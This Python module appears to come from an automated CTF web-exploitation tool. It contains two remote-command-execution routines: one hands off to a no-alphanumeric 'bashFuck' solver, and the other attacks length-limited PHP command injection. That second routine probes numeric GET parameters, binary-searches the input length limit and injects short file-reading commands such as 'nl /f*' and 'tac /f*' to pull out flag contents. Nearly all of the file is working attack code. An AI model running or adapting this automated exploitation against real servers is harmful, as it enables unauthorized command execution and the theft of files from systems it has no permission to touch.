"""yang_web.core.url_analyzer._attacks 子模块 _generic_rce（自 _attacks.py 拆分，请勿手工重排）。"""

from urllib.parse import urlparse, parse_qs, unquote, urlencode, urlunparse, quote
from urllib.request import Request, urlopen
from typing import List, Dict, Tuple, Optional, Callable
import re
import time
import html as _html
from .._engines import (AdaptiveScheduler, ConcurrentEngine, execute_attack)
from .._http import (FLAG_RE, USER_AGENT, send_request)





# ═══════════════════════════════════════════════════════════
#  bashFuck No-Alpha Command Execution (v3.7)
# ═══════════════════════════════════════════════════════════

def _try_bashfuck_exploit(url, results, fingerprint, on_progress=None, on_found=None):
    """bashFuck no-alpha RCE auto solver -- delegates to bashfuck_solver."""
    from yang_web.core.bashfuck_solver import auto_solve as bf_auto_solve

    def _emit(stage, item, status):
        if on_progress:
            try:
                on_progress(stage, item, status)
            except Exception:
                pass

    _emit("bashFuck", "running", "bashfuck_solver v1.0")

    result = bf_auto_solve(url, on_progress=_emit)
    if result and result.get("flag"):
        if on_found:
            try:
                on_found(result["flag"])
            except Exception:
                pass
        return {
            "flag": result["flag"],
            "vuln_confirmed": [{
                "type": "BASHFUCK_NO_ALPHA_RCE",
                "param": result.get("param"),
                "method": result.get("method"),
                "form": result.get("form"),
            }],
        }
    return None


def _try_length_limit_rce_exploit(url, results, fingerprint, on_progress=None, on_found=None):
    """v3.5: 长度限制 RCE — 7字符限制 + 数字参数名 ($_GET[1]).

    针对 strlen($_GET[p]) < N 的 PHP RCE 题型。
    核心逻辑: 探测数字参数名 → 二分找长度上限 → 短命令读flag.
    """
    import re as _bf_re
    try:
        from ...smart_solver import http_get, decode_body, _detect_php_source, find_flag
    except ImportError:
        try:
            from yang_web.core.smart_solver import http_get, decode_body, _detect_php_source, find_flag
        except ImportError:
            return None
    
    def _emit(stage, item, status):
        if on_progress:
            try: on_progress(stage, item, status)
            except Exception: pass
    
    def _found(flag):
        if on_found and not getattr(_found, '_called', False):
            _found._called = True
            try: on_found(flag)
            except Exception: pass
    
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
    
    _emit('len_rce', '参数探测', '尝试数字参数名 0-9...')
    
    # Step 1: 探测数字参数名 (0-9)
    for pnum in range(10):
        pname = str(pnum)
        code, body, _ = http_get(f"{base}?{pname}=1", timeout=5)
        if not body:
            continue
        text = decode_body(body)
        if not _detect_php_source(text):
            continue
        
        _emit('len_rce', '找到参数', f"param={pname}")
        
        # Step 2: 二分查找最大长度
        def _passes(length):
            url_m = base + '?' + pname + '=' + ('A' * length)
            _, body_m, _ = http_get(url_m, timeout=5)
            return _detect_php_source(decode_body(body_m))
        
        if _passes(20):
            max_len = 20
        elif _passes(7):
            lo, hi = 7, 20
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if _passes(mid): lo = mid
                else: hi = mid - 1
            max_len = lo
        else:
            lo, hi = 1, 7
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if _passes(mid): lo = mid
                else: hi = mid - 1
            max_len = lo
        
        if max_len < 2:
            continue
        _emit('len_rce', '长度上限', f"max={max_len} chars")
        
        # Step 3: 短命令 payload 库
        short_cmds = [
            (6, 'nl /f*'), (7, 'tac /f*'), (6, 'od /f*'),
            (7, 'nl /*f*'), (7, 'od /*f*'), (7, 'rev /f*'),
            (4, 'ls /'), (6, 'nl /h*'), (6, 'nl /r*'), (6, 'nl /t*'),
            (5, 'nl *'), (6, 'tac *'),
        ]
        
        tried = set()
        for pay_len, cmd in short_cmds:
            if pay_len > max_len or cmd in tried:
                continue
            tried.add(cmd)
            
            try:
                code, body, _ = http_get(f"{base}?{pname}={quote(cmd)}", timeout=8)
                text = decode_body(body)
                
                # 提取命令输出（剥离 PHP 源码）
                clean = _bf_re.sub(r'<[^>]+>', '', text)
                clean = clean.replace('&lt;','<').replace('&gt;','>').replace('&nbsp;',' ').replace('&amp;','&')
                out_lines = []
                for l in clean.split('\n'):
                    if '<?php' in l or 'function ' in l or 'preg_match' in l or 'highlight_file' in l:
                        break
                    s = l.strip()
                    if s: out_lines.append(s)
                output_text = '\n'.join(out_lines)
                
                # 搜 flag
                search = output_text if output_text else text
                f = find_flag(search)
                if f:
                    _emit('len_rce', 'FLAG!', f"cmd={cmd}")
                    _found(f)
                    return {'flag': f, 'vuln_confirmed': [
                        {'type': 'length_limit_rce', 'param': pname, 'cmd': cmd}
                    ], 'attacks_run': len(tried), 'timing_ms': 0}
                
                if out_lines:
                    _emit('len_rce', '命令输出', f"{cmd}: {' '.join(out_lines[:2])[:100]}")
            except Exception:
                continue
        break  # Found working param, no need to try more
    
    _emit('len_rce', '完成', '无长度限制RCE发现')
    return None
